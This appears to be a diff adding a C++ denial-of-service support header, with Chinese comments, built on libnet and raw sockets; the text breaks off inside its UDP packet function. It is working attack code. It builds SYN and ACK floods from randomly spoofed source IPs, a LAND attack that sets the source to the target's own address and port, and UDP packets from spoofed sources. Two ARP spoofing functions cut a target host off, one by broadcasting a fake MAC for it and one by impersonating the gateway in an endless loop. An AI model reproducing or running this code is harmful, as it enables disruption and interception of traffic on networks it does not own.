@@ -1,0 +1,848 @@
+//#ifndef TCP_DOS_SUPPORT
+//#define TCP_DOS_SUPPORT
+
+#include <libnet.h>
+#include <string.h>
+#include <string>
+//#include <stdlib>
+#include <iostream>
+#include <time.h>
+#include <sstream> 
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/if_ether.h>
+#include <net/ethernet.h>
+#include <net/if_arp.h>
+#include <net/if.h>
+#include <netpacket/packet.h>
+
+
+
+#define ETHER_HEADER_LEN sizeof(struct ether_header) /* 以太网帧首部长度 */
+
+#define ETHER_ARP_LEN sizeof(struct ether_arp) /* 整个arp结构长度 */
+
+#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN /* 以太网 + 整个arp结构长度 */
+
+#define IP_ADDR_LEN 4 /* IP地址长度 */
+
+#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff} /* 广播地址 */
+
+using namespace std;
+
+void err_exit(const char *err_msg)
+{
+    perror(err_msg);
+    exit(1);
+}
+
+/* 填充arp包 */
+struct ether_arp *fill_arp_packet(const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip)
+{
+    struct ether_arp *arp_packet;
+    struct in_addr src_in_addr, dst_in_addr;
+    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
+
+    /* IP地址转换 */
+    inet_pton(AF_INET, src_ip, &src_in_addr);
+    inet_pton(AF_INET, dst_ip, &dst_in_addr);
+
+    /* 整个arp包 */
+    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
+    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
+    arp_packet->arp_pro = htons(ETHERTYPE_IP);
+    arp_packet->arp_hln = ETH_ALEN;
+    arp_packet->arp_pln = IP_ADDR_LEN;
+    arp_packet->arp_op = htons(ARPOP_REQUEST);
+    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
+    memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
+    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
+    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);
+
+    return arp_packet;
+}
+
+/* arp请求 */
+void arp_request(char *if_name, char *dst_ip)
+{
+    struct sockaddr_ll saddr_ll;
+    struct ether_header *eth_header;
+    struct ether_arp *arp_packet;
+    struct ifreq ifr;
+    char buf[ETHER_ARP_PACKET_LEN];
+    unsigned char src_mac_addr[ETH_ALEN];
+    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
+    char *src_ip;
+    int sock_raw_fd, ret_len, i;
+
+    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
+        err_exit("socket()");
+
+    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
+    bzero(&ifr, sizeof(struct ifreq));
+    /* 网卡接口名 */
+    memcpy(ifr.ifr_name, if_name, strlen(if_name));
+
+    /* 获取网卡接口索引 */
+    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) == -1)
+        err_exit("ioctl() get ifindex");
+    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
+    saddr_ll.sll_family = PF_PACKET;
+
+    /* 获取网卡接口IP */
+    if (ioctl(sock_raw_fd, SIOCGIFADDR, &ifr) == -1)
+        err_exit("ioctl() get ip");
+    src_ip = inet_ntoa(((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr);
+    printf("local ip:%s\n", src_ip);
+
+    /* 获取网卡接口MAC地址 */
+    if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr))
+        err_exit("ioctl() get mac");
+    memcpy(src_mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
+    printf("local mac");
+    for (i = 0; i < ETH_ALEN; i++)
+        printf(":%02x", src_mac_addr[i]);
+    printf("\n");
+
+    bzero(buf, ETHER_ARP_PACKET_LEN);
+    /* 填充以太首部 */
+    eth_header = (struct ether_header *)buf;
+    memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
+    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
+    eth_header->ether_type = htons(ETHERTYPE_ARP);
+    /* arp包 */
+    arp_packet = fill_arp_packet(src_mac_addr, src_ip, dst_ip);
+    memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
+
+    /* 发送请求 */
+    ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
+    if ( ret_len > 0)
+        printf("sendto() ok!!!\n");
+
+    close(sock_raw_fd);
+}
+
+void arp_receive(string dst_ip,unsigned char * dst_mac)
+{
+    struct ether_arp *arp_packet;
+    char buf[ETHER_ARP_PACKET_LEN];
+    int sock_raw_fd, ret_len;
+
+    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
+        err_exit("socket()");
+
+    clock_t start, finish; 
+    double   duration = 0.0;
+    start = clock();
+
+    //每次调用arp_recive接收回复包时间为6秒，超时之后重新调用arp_request之后再调用arp_recive
+
+    while (duration<6.0)
+    {
+
+	finish = clock(); 
+	duration = (double)(finish - start) / CLOCKS_PER_SEC; 
+
+        bzero(buf, ETHER_ARP_PACKET_LEN);
+        ret_len = recv(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0);
+        if (ret_len > 0)
+        {
+            /* 剥去以太头部 */
+            arp_packet = (struct ether_arp *)(buf + ETHER_HEADER_LEN);
+            /* arp操作码为2代表arp应答 */
+            if (ntohs(arp_packet->arp_op) == 2)
+            {
+		stringstream stream[4];
+		string tmp;
+		string d;
+
+		for(int i= 0; i<4;i++)
+		{
+		    unsigned int p = arp_packet->arp_spa[i];
+		    stream[i] << p;
+		    stream[i] >> d;
+		    tmp.append(d);
+		    if(i<3)
+		    {
+			tmp+=".";
+		    }
+
+		}
+
+
+		if(tmp == dst_ip)
+		{
+		    for(int j=0;j<6;j++)
+		    {
+			dst_mac[j] = arp_packet->arp_sha[j];
+		    }
+		    break;
+		}
+            }
+        }
+    }
+
+    close(sock_raw_fd);
+}
+
+
+string create_random_IP()
+{
+	srand((unsigned)time(0));  
+	stringstream stream[4];
+	string tmp;
+	string d;
+	
+	for(int i=0;i<4;i++)
+	{
+		unsigned int p = rand()%256;
+		stream[i] << p;
+		stream[i] >> d;
+		tmp.append(d);
+		if(i<3)
+		{
+			tmp+=".";
+		}
+
+	}
+	//cout<<tmp.data()<<endl;
+	return tmp;
+}
+
+
+int construct_SYN_TCP(string dev,string dst_ip_s,int dst_port)
+{
+
+    srand((unsigned)time(0));  
+
+
+    string src_ip_s = create_random_IP();
+
+    libnet_t *handle; /* Libnet句柄 */
+    int packet_size; /* 构造的数据包大小 */
+    
+    char device[]= "ens33"; /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
+    char src_ip_str[] = "192.168.2.148"; /* 源IP地址字符串 */
+    char dst_ip_str[] = "125.216.249.125"; /* 目的IP地址字符串 */
+
+    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* 源MAC */
+    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* 目的MAC */
+    u_long dst_ip, src_ip; /* 网路序的目的IP和源IP */
+    char error[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
+    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* 各层build函数返回值 */
+    u_short proto = IPPROTO_TCP; /* 传输层协议 */
+    u_char payload[255] = {0}; /* 承载数据的数组，初值为空 */
+    u_long payload_s = 0; /* 承载数据的长度，初值为0 */
+    /* 把目的IP地址字符串转化成网络序 */
+    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
+    /* 把源IP地址字符串转化成网络序 */
+    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
+    /* 初始化Libnet */
+
+    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) 
+    {
+        printf("libnet_init failure\n");
+        return (-1);
+    };
+    strncpy((char*)payload, "", sizeof(payload)-1); /* 构造负载的内容 */
+    payload_s = strlen((char*)payload); /* 计算负载内容的长度 */
+
+#if 0
+    /* 构建TCP的选项,通常在第一个TCP通信报文中设置MSS */
+    tcp_op_tag = libnet_build_tcp_options(
+                payload,
+                payload_s,
+                handle,
+                0
+    );
+    if (tcp_op_tag == -1) {
+        printf("build_tcp_options failure\n");
+        return (-2);
+    };
+#endif
+
+    int rand_src_port = rand()%65535;
+
+    tcp_tag = libnet_build_tcp(
+                (uint16_t)rand_src_port, /* 源端口 */
+                (uint16_t)dst_port,      /* 目的端口 */
+                8888,                    /* 序列号 */
+                8889,                    /* 确认号 */
+                TH_SYN,                   /* Control flags */
+                14600,                    /* 窗口尺寸 */
+                0,                        /* 校验和,0为自动计算 */
+                0,                        /* 紧急指针 */
+                LIBNET_TCP_H + payload_s, /* 长度 */
+                payload,                    /* 负载内容 */
+                payload_s,                /* 负载内容长度 */
+                handle,                    /* libnet句柄 */
+                0                        /* 新建包 */
+    );
+
+    if (tcp_tag == -1) 
+    {
+        printf("libnet_build_tcp failure\n");
+        return (-3);
+    };
+
+    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
+    ip_tag = libnet_build_ipv4(
+        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IP协议块的总长,*/
+        0, /* tos */
+        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,随机产生0~65535 */
+        0, /* frag 片偏移 */
+        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,随机产生0~255 */
+        proto, /* 上层协议 */
+        0, /* 校验和，此时为0，表示由Libnet自动计算 */
+        src_ip, /* 源IP地址,网络序 */
+        dst_ip, /* 目标IP地址,网络序 */
+        NULL, /* 负载内容或为NULL */
+        0, /* 负载内容的大小*/
+        handle, /* Libnet句柄 */
+        0 /* 协议块标记可修改或创建,0表示构造一个新的*/
+    );
+    if (ip_tag == -1) {
+        printf("libnet_build_ipv4 failure\n");
+        return (-4);
+    };
+    /* 构造一个以太网协议块,只能用于LIBNET_LINK */
+    eth_tag = libnet_build_ethernet(
+        dst_mac, /* 以太网目的地址 */
+        src_mac, /* 以太网源地址 */
+        ETHERTYPE_IP, /* 以太网上层协议类型，此时为IP类型 */
+        NULL, /* 负载，这里为空 */ 
+        0, /* 负载大小 */
+        handle, /* Libnet句柄 */
+        0 /* 协议块标记，0表示构造一个新的 */ 
+    );
+    if (eth_tag == -1) {
+        printf("libnet_build_ethernet failure\n");
+        return (-5);
+    };
+    packet_size = libnet_write(handle); /* 发送已经构造的数据包*/
+    libnet_destroy(handle); /* 释放句柄 */
+    return (0);
+
+}
+
+int construct_land_TCP(string dev,string dst_ip_s,int dst_port)
+{
+
+    string src_ip_s = dst_ip_s.data();
+
+    libnet_t *handle; /* Libnet句柄 */
+    int packet_size; /* 构造的数据包大小 */
+    
+    char device[]= "ens33"; /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
+    char src_ip_str[] = "192.168.2.148"; /* 源IP地址字符串 */
+    char dst_ip_str[] = "125.216.249.125"; /* 目的IP地址字符串 */
+
+    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* 源MAC */
+    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* 目的MAC */
+    u_long dst_ip, src_ip; /* 网路序的目的IP和源IP */
+    char error[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
+    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* 各层build函数返回值 */
+    u_short proto = IPPROTO_TCP; /* 传输层协议 */
+    u_char payload[255] = {0}; /* 承载数据的数组，初值为空 */
+    u_long payload_s = 0; /* 承载数据的长度，初值为0 */
+    /* 把目的IP地址字符串转化成网络序 */
+    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
+    /* 把源IP地址字符串转化成网络序 */
+    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
+    /* 初始化Libnet */
+
+    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) 
+    {
+        printf("libnet_init failure\n");
+        return (-1);
+    };
+    strncpy((char*)payload, "", sizeof(payload)-1); /* 构造负载的内容 */
+    payload_s = strlen((char*)payload); /* 计算负载内容的长度 */
+
+#if 0
+    /* 构建TCP的选项,通常在第一个TCP通信报文中设置MSS */
+    tcp_op_tag = libnet_build_tcp_options(
+                payload,
+                payload_s,
+                handle,
+                0
+    );
+    if (tcp_op_tag == -1) {
+        printf("build_tcp_options failure\n");
+        return (-2);
+    };
+#endif
+
+    int rand_src_port = rand()%65535;
+
+    tcp_tag = libnet_build_tcp(
+                (uint16_t)dst_port,       /* 源端口 */
+                (uint16_t)dst_port,      /* 目的端口 */
+                8888,                    /* 序列号 */
+                8889,                    /* 确认号 */
+                TH_SYN,                   /* Control flags */
+                14600,                    /* 窗口尺寸 */
+                0,                        /* 校验和,0为自动计算 */
+                0,                        /* 紧急指针 */
+                LIBNET_TCP_H + payload_s, /* 长度 */
+                payload,                    /* 负载内容 */
+                payload_s,                /* 负载内容长度 */
+                handle,                    /* libnet句柄 */
+                0                        /* 新建包 */
+    );
+
+    if (tcp_tag == -1) 
+    {
+        printf("libnet_build_tcp failure\n");
+        return (-3);
+    };
+
+    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
+    ip_tag = libnet_build_ipv4(
+        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IP协议块的总长,*/
+        0, /* tos */
+        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,随机产生0~65535 */
+        0, /* frag 片偏移 */
+        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,随机产生0~255 */
+        proto, /* 上层协议 */
+        0, /* 校验和，此时为0，表示由Libnet自动计算 */
+        src_ip, /* 源IP地址,网络序 */
+        dst_ip, /* 目标IP地址,网络序 */
+        NULL, /* 负载内容或为NULL */
+        0, /* 负载内容的大小*/
+        handle, /* Libnet句柄 */
+        0 /* 协议块标记可修改或创建,0表示构造一个新的*/
+    );
+    if (ip_tag == -1) {
+        printf("libnet_build_ipv4 failure\n");
+        return (-4);
+    };
+    /* 构造一个以太网协议块,只能用于LIBNET_LINK */
+    eth_tag = libnet_build_ethernet(
+        dst_mac, /* 以太网目的地址 */
+        src_mac, /* 以太网源地址 */
+        ETHERTYPE_IP, /* 以太网上层协议类型，此时为IP类型 */
+        NULL, /* 负载，这里为空 */ 
+        0, /* 负载大小 */
+        handle, /* Libnet句柄 */
+        0 /* 协议块标记，0表示构造一个新的 */ 
+    );
+    if (eth_tag == -1) {
+        printf("libnet_build_ethernet failure\n");
+        return (-5);
+    };
+    packet_size = libnet_write(handle); /* 发送已经构造的数据包*/
+    libnet_destroy(handle); /* 释放句柄 */
+    return (0);
+}
+
+int construct_ack_TCP(string dev,string dst_ip_s,int dst_port)
+{
+    srand((unsigned)time(0));  
+
+
+    string src_ip_s = create_random_IP();
+
+    libnet_t *handle; /* Libnet句柄 */
+    int packet_size; /* 构造的数据包大小 */
+    
+    char device[]= "ens33"; /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
+    char src_ip_str[] = "192.168.2.148"; /* 源IP地址字符串 */
+    char dst_ip_str[] = "125.216.249.125"; /* 目的IP地址字符串 */
+
+    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* 源MAC */
+    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* 目的MAC */
+    u_long dst_ip, src_ip; /* 网路序的目的IP和源IP */
+    char error[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
+    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* 各层build函数返回值 */
+    u_short proto = IPPROTO_TCP; /* 传输层协议 */
+    u_char payload[255] = {0}; /* 承载数据的数组，初值为空 */
+    u_long payload_s = 0; /* 承载数据的长度，初值为0 */
+    /* 把目的IP地址字符串转化成网络序 */
+    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
+    /* 把源IP地址字符串转化成网络序 */
+    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
+    /* 初始化Libnet */
+
+    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) 
+    {
+        printf("libnet_init failure\n");
+        return (-1);
+    };
+    strncpy((char*)payload, "", sizeof(payload)-1); /* 构造负载的内容 */
+    payload_s = strlen((char*)payload); /* 计算负载内容的长度 */
+
+#if 0
+    /* 构建TCP的选项,通常在第一个TCP通信报文中设置MSS */
+    tcp_op_tag = libnet_build_tcp_options(
+                payload,
+                payload_s,
+                handle,
+                0
+    );
+    if (tcp_op_tag == -1) {
+        printf("build_tcp_options failure\n");
+        return (-2);
+    };
+#endif
+
+    int rand_src_port = rand()%65535;
+
+    tcp_tag = libnet_build_tcp(
+                (uint16_t)rand_src_port, /* 源端口 */
+                (uint16_t)dst_port,      /* 目的端口 */
+                8888,                    /* 序列号 */
+                8889,                    /* 确认号 */
+                TH_ACK,                   /* Control flags */
+                14600,                    /* 窗口尺寸 */
+                0,                        /* 校验和,0为自动计算 */
+                0,                        /* 紧急指针 */
+                LIBNET_TCP_H + payload_s, /* 长度 */
+                payload,                    /* 负载内容 */
+                payload_s,                /* 负载内容长度 */
+                handle,                    /* libnet句柄 */
+                0                        /* 新建包 */
+    );
+
+    if (tcp_tag == -1) 
+    {
+        printf("libnet_build_tcp failure\n");
+        return (-3);
+    };
+
+    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
+    ip_tag = libnet_build_ipv4(
+        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IP协议块的总长,*/
+        0, /* tos */
+        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,随机产生0~65535 */
+        0, /* frag 片偏移 */
+        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,随机产生0~255 */
+        proto, /* 上层协议 */
+        0, /* 校验和，此时为0，表示由Libnet自动计算 */
+        src_ip, /* 源IP地址,网络序 */
+        dst_ip, /* 目标IP地址,网络序 */
+        NULL, /* 负载内容或为NULL */
+        0, /* 负载内容的大小*/
+        handle, /* Libnet句柄 */
+        0 /* 协议块标记可修改或创建,0表示构造一个新的*/
+    );
+    if (ip_tag == -1) {
+        printf("libnet_build_ipv4 failure\n");
+        return (-4);
+    };
+    /* 构造一个以太网协议块,只能用于LIBNET_LINK */
+    eth_tag = libnet_build_ethernet(
+        dst_mac, /* 以太网目的地址 */
+        src_mac, /* 以太网源地址 */
+        ETHERTYPE_IP, /* 以太网上层协议类型，此时为IP类型 */
+        NULL, /* 负载，这里为空 */ 
+        0, /* 负载大小 */
+        handle, /* Libnet句柄 */
+        0 /* 协议块标记，0表示构造一个新的 */ 
+    );
+    if (eth_tag == -1) {
+        printf("libnet_build_ethernet failure\n");
+        return (-5);
+    };
+    packet_size = libnet_write(handle); /* 发送已经构造的数据包*/
+    libnet_destroy(handle); /* 释放句柄 */
+    return (0);
+}
+
+int ARP_block_single_host_in(string dev,string src_ip_s)
+{
+    //该函数阻断目标机器接受外部发送向该主机的数据包(对网段内其他主机广播一个假的目标主机的mac地址)
+    libnet_t *handle;        /* Libnet句柄 */
+    int packet_size;
+
+    srand((unsigned)time(0));  
+    string dst_ip_s = create_random_IP();
+
+    char *device = "eth0";   /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
+
+    u_int8_t *src_ip_str = "192.168.128.200";       /* 源IP地址字符串 */   //这里是被攻击的目标主机的IP地址
+    u_int8_t *dst_ip_str = "192.168.128.88";        /* 目的IP地址字符串 */ //这个其实不重要因为是arp广播包
+
+    u_int8_t src_mac[6] = {0x00, 0x0c, 0x29, 0x73, 0xfa, 0x86};/* 源MAC */
+    u_int8_t dst_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};/* 目的MAC,广播地址 */
+
+    /* 接收方MAC,ARP请求目的就是要询问对方MAC,所以这里填写0 */
+    u_int8_t rev_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    u_int32_t dst_ip, src_ip;              /* 网路序的目的IP和源IP */
+    char error[LIBNET_ERRBUF_SIZE];        /* 出错信息 */
+    libnet_ptag_t arp_proto_tag, eth_proto_tag;
+
+    /* 把目的IP地址字符串转化成网络序 */
+    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
+    /* 把源IP地址字符串转化成网络序 */
+    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
+
+    if ( dst_ip == -1 || src_ip == -1 ) {
+        printf("ip address convert error\n");
+        exit(-1);
+    };
+    /* 初始化Libnet,注意第一个参数和TCP初始化不同 */
+    if ( (handle = libnet_init(LIBNET_LINK_ADV, dev.data(), error)) == NULL ) {
+        printf("libnet_init: error [%s]\n", error);
+        exit(-2);
+    };
+
+    /* 构造arp协议块 */
+    arp_proto_tag = libnet_build_arp(
+                ARPHRD_ETHER,        /* 硬件类型,1表示以太网硬件地址 */
+                ETHERTYPE_IP,        /* 0x0800表示询问IP地址 */
+                6,                   /* 硬件地址长度 */
+                4,                   /* IP地址长度 */
+                ARPOP_REQUEST,       /* 操作方式:ARP请求 */
+                src_mac,             /* source MAC addr */
+                (u_int8_t *)&src_ip, /* src proto addr */
+                rev_mac,             /* dst MAC addr */
+                (u_int8_t *)&dst_ip, /* dst IP addr */
+                NULL,                /* no payload */
+                0,                   /* payload length */
+                handle,              /* libnet tag */
+                0                    /* Create new one */
+    );
+    if (arp_proto_tag == -1)    {
+        printf("build IP failure\n");
+        exit(-3);
+    };
+
+    /* 构造一个以太网协议块
+    You should only use this function when
+    libnet is initialized with the LIBNET_LINK interface.*/
+    eth_proto_tag = libnet_build_ethernet(
+        dst_mac,         /* 以太网目的地址 */
+        src_mac,         /* 以太网源地址 */
+        ETHERTYPE_ARP,   /* 以太网上层协议类型，此时为ARP请求 */
+        NULL,            /* 负载，这里为空 */
+        0,               /* 负载大小 */
+        handle,          /* Libnet句柄 */
+        0                /* 协议块标记，0表示构造一个新的 */
+    );
+    if (eth_proto_tag == -1) {
+        printf("build eth_header failure\n");
+        return (-4);
+    };
+
+    packet_size = libnet_write(handle);    /* 发送已经构造的数据包*/
+
+    libnet_destroy(handle);                /* 释放句柄 */
+
+    return (0);
+}
+
+int ARP_block_single_host_out(string dev,string dst_ip_s,string src_ip_s)
+{
+    //该函数阻断目标机器向外部发送数据包的功能(对该机器声明一个假的网关mac地址)
+    //dst_ip_s干扰的目标IP
+    //src_ip_s冒充的网关IP
+    libnet_t *handle;        /* Libnet句柄 */
+    int packet_size;
+
+    //char *device = "eth0";    /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
+
+    //u_int8_t *src_ip_str = "192.168.2.30";        /* 冒充的网关IP */
+    //u_int8_t *dst_ip_str = "192.168.2.170";        /* 干扰的目标IP */
+
+    u_int8_t src_mac[6] = {0x00, 0x0c, 0x29, 0x73, 0xfa, 0x11};/* 虚假的源MAC */
+
+    u_int8_t dst_mac[6];/* 干扰的目标MAC */
+
+
+    while((int)dst_mac[0]==0 && (int)dst_mac[1]==0 && (int)dst_mac[2]==0 && (int)dst_mac[3]==0 && (int)dst_mac[4]==0 && (int)dst_mac[5]==0)
+    {
+	arp_request((char*)dev.data(), (char*)dst_ip_s.data());
+	arp_receive(dst_ip_s,(unsigned char*)dst_mac);
+    }
+
+    
+    u_int32_t dst_ip, src_ip;                /* 网路序的目的IP和源IP */
+    char error[LIBNET_ERRBUF_SIZE];        /* 出错信息 */
+    libnet_ptag_t arp_proto_tag, eth_proto_tag;
+
+    /* 把目的IP地址字符串转化成网络序 */
+    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
+    /* 把源IP地址字符串转化成网络序 */
+    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
+
+    if ( dst_ip == -1 || src_ip == -1 ) {
+        printf("ip address convert error\n");
+        exit(-1);
+    };
+    /* 初始化Libnet,注意第一个参数和TCP初始化不同 */
+    if ( (handle = libnet_init(LIBNET_LINK_ADV, dev.data(), error)) == NULL ) {
+        printf("libnet_init: error [%s]\n", error);
+        exit(-2);
+    };
+
+    /* 构造arp协议块 */
+    arp_proto_tag = libnet_build_arp(
+                ARPHRD_ETHER,        /* 硬件类型,1表示以太网硬件地址 */ 
+                ETHERTYPE_IP,        /* 0x0800表示询问IP地址 */ 
+                6,                    /* 硬件地址长度 */ 
+                4,                    /* IP地址长度 */ 
+                ARPOP_REPLY,        /* 操作方式:ARP请求 */ 
+                src_mac,                /* source MAC addr */ 
+                (u_int8_t *)&src_ip,    /* src proto addr */ 
+                dst_mac,                /* dst MAC addr */ 
+                (u_int8_t *)&dst_ip,    /* dst IP addr */ 
+                NULL,                /* no payload */ 
+                0,                    /* payload length */ 
+                handle,                /* libnet tag */ 
+                0                    /* Create new one */
+    );
+    if (arp_proto_tag == -1)    {
+        printf("build IP failure\n");
+        exit(-3);
+    };
+
+    /* 构造一个以太网协议块
+    You should only use this function when 
+    libnet is initialized with the LIBNET_LINK interface.*/
+    eth_proto_tag = libnet_build_ethernet(
+        dst_mac,            /* 以太网目的地址 */
+        src_mac,            /* 以太网源地址 */
+        ETHERTYPE_ARP,    /* 以太网上层协议类型，此时为ARP请求 */
+        NULL,            /* 负载，这里为空 */ 
+        0,                /* 负载大小 */
+        handle,            /* Libnet句柄 */
+        0                /* 协议块标记，0表示构造一个新的 */ 
+    );
+    if (eth_proto_tag == -1)    {
+        printf("build eth_header failure\n");
+        return (-4);
+    };
+
+    while(1) {
+        packet_size = libnet_write(handle);        /* 死循环发送arp欺骗广播 */
+        usleep(1000);
+    };
+
+    libnet_destroy(handle);                /* 释放句柄 */
+
+    return (0);
+}
+
+int construct_UDP(string dev,string dst_ip_s,int dst_port)
+{
+
+    srand((unsigned)time(0));  
+
+
+    string src_ip_s = create_random_IP();
+
+    libnet_t *handle; /* Libnet句柄 */
+    int packet_size; /* 构造的数据包大小 */
+
+    char device[] = "eth0"; /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
+    char src_ip_str[] = "192.168.2.148"; /* 源IP地址字符串 */
+    char dst_ip_str[] = "192.168.2.170"; /* 目的IP地址字符串 */
+
+    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* 源MAC */
+    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* 目的MAC */
+    u_long dst_ip, src_ip; /* 网路序的目的IP和源IP */
+    char error[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
+    libnet_ptag_t eth_tag, ip_tag, udp_tag; /* 各层build函数返回值 */
+    u_short proto = IPPROTO_UDP; /* 传输层协议 */
+    u_char payload[255] = {0}; /* 承载数据的数组，初值为空 */
+    u_long payload_s = 0; /* 承载数据的长度，初值为0 */
+
+    /* 把目的IP地址字符串转化成网络序 */
+    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
+    /* 把源IP地址字符串转化成网络序 */
+    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
+
+    /* 初始化Libnet */
+    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) {
+        printf("libnet_init failure\n");
+        return (-1);
+    };
+
+    strncpy((char*)payload, "testfwfewfwfeqwefqefqfe", sizeof(payload)-1); /* 构造负载的内容 */
+    payload_s = strlen((char*)payload); /* 计算负载内容的长度 */
+
+    u_short rand_src_port = (u_short)rand()%6553;
+
+    u_short u_dst_port = (u_short)dst_port;
+
+    udp_tag = libnet_build_udp(
+                rand_src_port, /* 源端口 */
+                u_dst_port, /* 目的端口 */
+                LIBNET_UDP_H + payload_s, /* 长度 */
+                0, /* 校验和,0为libnet自动计算 */
+                payload, /* 负载内容 */
+                payload_s, /* 负载内容长度 */
+                handle, /* libnet句柄 */
+                0 /* 新建包 */
+    );
+    if (udp_tag == -1) {
+        printf("libnet_build_tcp failure\n");
+        return (-3);
+    };
+
+    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
+    ip_tag = libnet_build_ipv4(
+        LIBNET_IPV4_H + LIBNET_UDP_H + payload_s, /* IP协议块的总长,*/
+        0, /* tos */
+        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,随机产生0~65535 */
+        0, /* frag 片偏移 */
+        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,随机产生0~255 */
+        proto, /* 上层协议 */
+        0, /* 校验和，此时为0，表示由Libnet自动计算 */
+        src_ip, /* 源IP地址,网络序 */
+        dst_ip, /* 目标IP地址,网络序 */
+        NULL, /* 负载内容或为NULL */
+        0, /* 负载内容的大小*/
+        handle, /* Libnet句柄 */
+        0 /* 协议块标记可修改或创建,0表示构造一个新的*/
+    );
+    if (ip_tag == -1) {
+        printf("libnet_build_ipv4 failure\n");
+        return (-4);
+    };
+
+    /* 构造一个以太网协议块,只能用于LIBNET_LINK */
+    eth_tag = libnet_build_ethernet(
+        dst_mac, /* 以太网目的地址 */
